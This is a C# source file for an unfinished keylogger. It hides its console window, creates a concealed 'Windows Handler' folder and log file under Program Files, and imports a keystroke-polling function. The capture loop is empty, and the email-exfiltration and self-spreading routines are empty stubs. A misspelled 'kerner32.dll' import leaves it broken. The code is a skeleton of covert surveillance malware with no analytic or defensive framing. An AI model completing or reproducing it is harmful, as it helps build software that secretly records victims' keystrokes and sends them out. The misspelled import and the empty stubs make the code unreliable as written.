using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using Microsoft.Win32;
using System.Diagnostics;

namespace KeyLogger
{
    class Program
    {
        public static bool checkSystemEvents = false;
        public static string path = @"C:\Program Files\Windows Handler\";
        public static string filePath = @"C:\Program Files\Windows Handler\Handler.dat";

        public static string appName = Process.GetCurrentProcess().MainModule.FileName;
        public static string appExe = Path.GetFileName(appName);

        [DllImport("kerner32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        //const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            try
            {
                Program program = new Program();

                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);

                while (!File.Exists(filePath))
                {
                    if (!Directory.Exists(path))
                    {
                        DirectoryInfo di = Directory.CreateDirectory(path);
                        di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                        File.Create(filePath);
                    }
                    else if (Directory.Exists(path) && !File.Exists(filePath))
                    {
                        File.Create(filePath);
                    }
                }

                using (var writer = new StreamWriter(filePath))
                {
                    while (!checkSystemEvents)
                    {
                        Thread.Sleep(10);







                    }
                }
            }
            catch (Exception ex)
            {
                return;
            }
        }

        private static void SystemEvents()
        { 
        


        }

        private void SendMail()
        { 

        
        }

        private void Spread()
        { 
        
        
        
        }

    }
}
